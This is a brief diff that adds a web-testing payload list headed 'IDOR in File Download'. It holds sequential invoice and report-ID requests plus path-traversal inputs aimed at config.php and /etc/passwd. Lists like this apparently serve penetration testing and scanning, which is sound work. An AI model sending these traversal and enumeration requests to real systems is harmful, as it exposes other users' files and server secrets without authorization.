@@ -1,0 +1,7 @@
+# ---- IDOR in File Download ----
+/download?file=invoice_001.pdf
+/download?file=invoice_002.pdf
+/download?file=../config.php
+/download?file=../../etc/passwd
+/export?report_id=1
+/export?report_id=2
